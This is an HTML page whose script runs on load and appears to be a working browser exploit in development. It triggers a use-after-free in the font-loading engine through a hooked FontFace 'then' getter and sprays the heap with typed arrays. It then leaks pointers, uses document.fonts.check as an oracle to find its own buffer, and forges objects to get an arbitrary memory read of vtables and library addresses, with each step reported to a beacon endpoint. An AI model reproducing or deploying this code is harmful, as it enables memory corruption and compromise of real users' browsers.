<!DOCTYPE html><html><head><meta charset="utf-8"><title>T13N</title></head>
<body><pre id="O">T13N</pre>
<script>
'use strict';
function bs(t){try{var x=new XMLHttpRequest();x.open('GET','/beacon/T14T-'+encodeURIComponent(t),false);x.send(null);}catch(e){}}
function bh(t,v){bs(t+'='+hex(v));}
bs('BOOT');
var K=1024,PF=500,SZ=192,fired=false,faces=null,AT=0;

function le48(v,o){return v[o]+v[o+1]*0x100+v[o+2]*0x10000+v[o+3]*0x1000000+v[o+4]*0x100000000+v[o+5]*0x10000000000;}
function hex(x){return '0x'+Math.round(x).toString(16);}
function hx(x){return x.toString(16);}
function wr48(u,o,x){for(var k=0;k<6;k++){u[o+k]=x%256;x=Math.floor(x/256);}u[o+6]=0;u[o+7]=0;}
function put32(u,o,x){u[o]=x&0xFF;u[o+1]=(x>>8)&0xFF;u[o+2]=(x>>16)&0xFF;u[o+3]=(x>>24)&0xFF;}
function align256(x){return Math.floor(x/256)*256;}

window.__pf=[];for(var pfi=0;pfi<PF;pfi++)window.__pf.push(new Uint8Array(new ArrayBuffer(SZ)));

function start(){
  AT++;if(AT>1)return;
  try{if(sessionStorage.getItem('uaf')){bs('DOUBLE');return;}sessionStorage.setItem('uaf','1');}catch(e){}
  var vf;try{vf=new FontFace('vf','local(Helvetica)',{unicodeRange:'U+0041'});}catch(e){return;}
  try{document.fonts.add(vf);}catch(e){}
  try{void vf.loaded;}catch(e){}
  var fs=document.createElement('style');
  fs.textContent='@font-face{font-family:v1;src:local(Arial);unicode-range:U+0042;}';
  document.head.appendChild(fs);
  Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
    if(fired)return undefined;fired=true;
    try{fs.remove();}catch(e){}try{document.fonts.delete(this);}catch(e){}
    try{document.body.offsetHeight;}catch(e){}
    window.__sp=[];
    for(var k=0;k<K;k++){
      var w=new Uint8Array(new ArrayBuffer(SZ));
      w[0]=0;w[1]=0;w[2]=0;w[3]=0x80;
      var mj=0x1000+k;w[4]=mj&0xFF;w[5]=(mj>>8)&0xFF;
      w[0x82]=3;
      w[0x38]=0x00;w[0x39]=0x10;w[0x3A]=0x00;w[0x3B]=0x00;
      w[0x3C]=0x00;w[0x3D]=0x20;w[0x3E]=0x00;w[0x3F]=0x00;
      window.__sp.push(w);
    }
    return undefined;
  },set:function(){}});
  document.fonts.load('1em vf, v1','AB').then(function(f){faces=f;setTimeout(phase,100);},function(){});
}

function parseCSS(s){
  var bytes=[];var i=0;
  while(i<s.length&&bytes.length<32){
    if(s[i]==='\\'){
      i++;var h='';
      for(var j=0;j<6&&i<s.length;j++){
        var c=s.charCodeAt(i);
        if((c>=48&&c<=57)||(c>=65&&c<=70)||(c>=97&&c<=102)){h+=s[i];i++;}
        else break;
      }
      if(h.length)bytes.push(parseInt(h,16)&0xFF);
      if(i<s.length&&s[i]===' ')i++;
    } else {bytes.push(s.charCodeAt(i));i++;}
  }
  return bytes;
}

function phase(){
  var bufs=[],L1=0,L2=0;
  for(var i=0;i<window.__sp.length;i++){
    var a=le48(window.__sp[i],0x58);
    if(a>0x1000000000){
      var b2=le48(window.__sp[i],0x68);
      if(L1===0){L1=a;L2=b2;}
      bufs.push([window.__sp[i],b2,i]);
    }
  }
  bs('L1='+hex(L1)+'-L2='+hex(L2)+'-bufs='+bufs.length);
  if(!bufs.length){bs('NOLEAK');return;}
  var h0=bufs[0][0];

  for(var ib=0;ib<bufs.length;ib++){
    var vb=bufs[ib][0];
    vb[0]=2;wr48(vb,0x08,bufs[ib][1]);wr48(vb,0x10,0);
    vb[0x82]=0;wr48(vb,0x20,0);put32(vb,0x28,0);put32(vb,0x2C,0);
  }

  setTimeout(function(){
    bs('FACES='+faces.length);
    for(var i2=0;i2<faces.length;i2++){try{faces[i2].family='zz'+i2;}catch(e){}}
    var famP=le48(h0,0x18);
    bh('FAM-P',famP);

    setTimeout(function(){
      for(var i3=0;i3<faces.length;i3++){try{document.fonts.add(faces[i3]);}catch(e){}}
      setTimeout(function(){
        var zi=-1;
        for(var q=0;q<faces.length;q++){
          var r=null;try{r=document.fonts.check('1em zz'+q,'A');}catch(e){r='EX';}
          if(r===false){zi=q;break;}
        }
        bs('ZI='+zi);
        if(zi<0){bs('NOORACLE');return;}

        // capture h0 as the CSS engine left it (before oracle/forge mods)
        var preEngine=[];
        for(var pe=0;pe<SZ;pe++)preEngine.push(h0[pe]);
        bs('ENGINE-SNAP');

        var famP2=le48(h0,0x18);
        bh('FAM-P2',famP2);

        function setR(addr){for(var ir=0;ir<bufs.length;ir++)wr48(bufs[ir][0],0x20,addr);}
        function chk(c){try{return document.fonts.check('1em zz'+zi,String.fromCodePoint(c))===false;}catch(e){return null;}}

        for(var ip=0;ip<bufs.length;ip++){
          bufs[ip][0][0x82]=0;
          bufs[ip][0][0x28]=1;bufs[ip][0][0x2C]=1;
          wr48(bufs[ip][0],0x20,L2);
        }
        put32(h0,0x38,0xBEEF);put32(h0,0x3C,0xCAFE);
        for(var ip2=1;ip2<bufs.length;ip2++){
          put32(bufs[ip2][0],0x38,0x1000);put32(bufs[ip2][0],0x3C,0x2000);
        }

        var self=0;
        var famA=align256(famP2||0);
        var anchors=famA?[famA,align256(L1),align256(L2)]:[align256(L1),align256(L2)];
        var ranges=[0x20000,0x400000,0x400000];
        for(var an=0;an<anchors.length&&!self;an++){
          var r=ranges[Math.min(an,ranges.length-1)];
          var cS=anchors[an]-r,cE=anchors[an]+r;
          if(cS<0x10000)cS=0x10000;
          for(var a=cS;a<cE&&!self;a+=64){
            setR(a+0x38);
            if(chk(0xBEEF)===true&&chk(0xBEEE)===false&&chk(0xCAFE)===true&&chk(0xCAFF)===false){
              self=a;
            }
          }
        }
        bs('SELF='+hex(self));
        if(!self){bs('NOSELF');return;}

        put32(h0,0x70,8);put32(h0,0x74,0x10);
        h0[0x78]=14;h0[0x79]=0;
        wr48(h0,0x7A,self+0x90);
        put32(h0,0x90,3);put32(h0,0x94,72);
        wr48(h0,0x98,self+0x30);
        put32(h0,0x30,4);put32(h0,0x34,8);
        put32(h0,0x40,4);
        h0[0x44]=0x7A;h0[0x45]=0x7A;h0[0x46]=0x71;
        h0[0xA8]=0x41;h0[0xA9]=0x42;h0[0xAA]=0x43;h0[0xAB]=0x44;
        h0[0xAC]=0x45;h0[0xAD]=0x46;h0[0xAE]=0x47;h0[0xAF]=0x48;
        wr48(h0,0x38,self+0xA8);
        wr48(h0,0x08,self+0x70);
        bs('FORGE-SETUP');

        var sty='';
        try{sty=String(faces[zi].style);}catch(e){bs('FORGE-EX='+e.message);bs('DONE');return;}
        bs('STY-LEN='+sty.length);
        var cc=[];
        for(var ci=0;ci<Math.min(sty.length,20);ci++)cc.push(hx(sty.charCodeAt(ci)));
        bs('STY-RAW='+cc.join(','));
        var rawBytes=[];
        for(var ri=0;ri<Math.min(sty.length,8);ri++)rawBytes.push(sty.charCodeAt(ri));
        var rawOK=rawBytes.length>=8;
        for(var ri2=0;ri2<8&&rawOK;ri2++){if(rawBytes[ri2]!==0x41+ri2)rawOK=false;}
        var cssBytes=parseCSS(sty);
        var cssOK=cssBytes.length>=8;
        for(var ci2=0;ci2<8&&cssOK;ci2++){if(cssBytes[ci2]!==0x41+ci2)cssOK=false;}
        var useRaw=rawOK,useCSS=cssOK;
        bs('FORGE-RAW='+(rawOK?'OK':'NO')+'-CSS='+(cssOK?'OK':'NO'));
        if(!rawOK&&!cssOK){
          var pb=[];for(var pi=0;pi<cssBytes.length;pi++)pb.push(hx(cssBytes[pi]));
          bs('PARSED='+pb.join(','));
          bs('DONE');return;
        }

        function readBytes(target,n){
          wr48(h0,0x38,target);put32(h0,0x70,n);
          var s;try{s=String(faces[zi].style);}catch(e){return null;}
          var b;
          if(useRaw){b=[];for(var j=0;j<Math.min(s.length,n);j++)b.push(s.charCodeAt(j));}
          else{b=parseCSS(s);}
          return b.length>=n?b:null;
        }
        function readQ(target){
          var b=readBytes(target,8);
          if(!b||b.length<6)return null;
          return b[0]+b[1]*0x100+b[2]*0x10000+b[3]*0x1000000
                +b[4]*0x100000000+b[5]*0x10000000000;
        }
        function read32(target){
          var b=readBytes(target,4);
          if(!b)return null;
          return b[0]+b[1]*0x100+b[2]*0x10000+b[3]*0x1000000;
        }

        bs('RQ-ENTER');
        var rL1=readQ(self+0x58);
        bs('RQ-L1='+(rL1!==null?hex(rL1):'null')+'-exp='+hex(L1));
        var rL2=readQ(self+0x68);
        bs('RQ-L2='+(rL2!==null?hex(rL2):'null')+'-exp='+hex(L2));
        var rqOK=(rL1===L1&&rL2===L2);
        bs('READQ='+(rqOK?'VERIFIED':'MISMATCH'));
        if(!rqOK){bs('DONE');return;}

        var wpi=readQ(L2+0x08);
        bh('WPI',wpi||0);
        if(wpi===null||wpi<0x1000000000){bs('CHAIN-DEAD');bs('DONE');return;}
        var vtPtr=readQ(wpi);
        bh('VT',vtPtr||0);
        if(vtPtr===null||vtPtr<0x800000000){bs('CHAIN-DEAD');bs('DONE');return;}
        var vt0=readQ(vtPtr);
        var delta=(vt0&&vt0>0x800000000)?(vtPtr-vt0):0;
        bh('D',delta);

        // T14T: rr() calibration + family setter
        var vt=vtPtr;
        bs('VTS='+hex(vt-0x820d85b28));

        // Phase R: rr() calibration
        // cobrajet302gt's rule: bytes[0]+[1] at target must be 0, engine reads le48 from +2
        // Write zero-padded patterns at h0[0xB0] and h0[0xB8]
        bs('PR');
        function rrLo(){
          var lo=0,hi=0x10FFFF;
          for(var i=0;i<21;i++){var m=(lo+hi)>>>1;if(chk(m)===true)hi=m;else lo=m+1;}
          return lo;
        }
        function rrHi(){
          var lo=0,hi=0x10FFFF;
          for(var i=0;i<21;i++){var m=((lo+hi)>>>1)+((lo+hi)&1);if(chk(m)===true)lo=m;else hi=m-1;}
          return lo;
        }
        // rr() calibration: targeted probes (not broken bisect)
        // Self-search proved: put32(h0,0x38,0xBEEF)+put32(h0,0x3C,0xCAFE) at h0[0x20]=self+0x38
        // → chk(0xBEEF)=T, chk(0xBEEE)=F, chk(0xCAFE)=T, chk(0xCAFF)=F
        // Pattern A: replicate self-search setup at h0[0xB0]
        for(var rb=0;rb<16;rb++)h0[0xB0+rb]=0;
        put32(h0,0xB0,0xBEEF);put32(h0,0xB4,0xCAFE);
        setR(self+0xB0);
        // 7 targeted probes to map the range shape
        var pA=[];
        var tvals=[0,0xBEEE,0xBEEF,0xC000,0xCAFE,0xCAFF,0x10FFFF];
        for(var ti=0;ti<tvals.length;ti++)pA.push(hex(tvals[ti])+'='+(chk(tvals[ti])===true?'T':'F'));
        bs('RR-MAP='+pA.join(','));
        // Pattern B at h0[0xB8]: different range
        put32(h0,0xB8,0x1234);put32(h0,0xBC,0x5678);
        setR(self+0xB8);
        var pB=[];
        var tvals2=[0,0x1233,0x1234,0x3000,0x5678,0x5679,0x10FFFF];
        for(var ti2=0;ti2<tvals2.length;ti2++)pB.push(hex(tvals2[ti2])+'='+(chk(tvals2[ti2])===true?'T':'F'));
        bs('RR-MAP2='+pB.join(','));
        // find-then-bisect for pattern B (should work, range is reachable)
        function rrFindHi(){
          var lo=0,hi=0x10FFFF;
          for(var i=0;i<21;i++){var m=((lo+hi)>>>1)+((lo+hi)&1);if(chk(m)===true)lo=m;else hi=m-1;}
          return lo;
        }
        function rrFindLo(top){
          var lo=0,hi=top;
          for(var i=0;i<21;i++){var m=(lo+hi)>>>1;if(chk(m)===true)hi=m;else lo=m+1;}
          return lo;
        }
        var bHi=rrFindHi();
        var bLo=(bHi>0)?rrFindLo(bHi):0x110000;
        bs('RR-FTB='+hex(bLo)+','+hex(bHi)+'-exp=1234,5678');
        // restore h0[0x20]
        wr48(h0,0x20,self+0x38);

        // Phase E (3 readQ): ext-lib cross-correlate only
        bs('PE');
        var gBase=vt+0x101F00;
        var extIdx=[962,967,1207];
        var ext263=[0x80a44a830,0x80a5e0d30,0x80a5c05f0];
        for(var ei=0;ei<extIdx.length;ei++){
          var ev=readQ(gBase+extIdx[ei]*8);
          if(ev===null){bs('EXT'+extIdx[ei]+'=null');continue;}
          var ed=ev-ext263[ei];
          bs('EXT'+extIdx[ei]+'='+hex(ev)+'/d'+(ed>=0?'+':'')+hex(ed));
        }

        // Phase F: family setter + h0 diff (may OOM — expendable)
        bs('PF');
        var snap=[];
        for(var si=0;si<SZ;si++)snap.push(h0[si]);
        var fOK=false;
        try{faces[zi].family='zzq';fOK=true;}catch(e){bs('FSET-EX='+e.message);}
        bs('FSET='+(fOK?'OK':'FAIL'));
        if(fOK){
          var diffs=[];
          for(var di=0;di<SZ;di++){
            if(h0[di]!==snap[di])diffs.push(hx(di)+':'+hx(snap[di])+'>'+hx(h0[di]));
          }
          bs('FD-'+diffs.length+(diffs.length?'-'+diffs.join(','):''));
          var fg='';try{fg=String(faces[zi].family);}catch(e){fg='EX';}
          bs('FGET='+fg.substring(0,20));
        }

        bs('DONE');
        document.getElementById('O').textContent='T14T DONE';
      },50);
    },50);
  },50);
}
if(document.readyState==='complete'||document.readyState==='interactive')setTimeout(start,0);
else document.addEventListener('DOMContentLoaded',start);
</script></body></html>
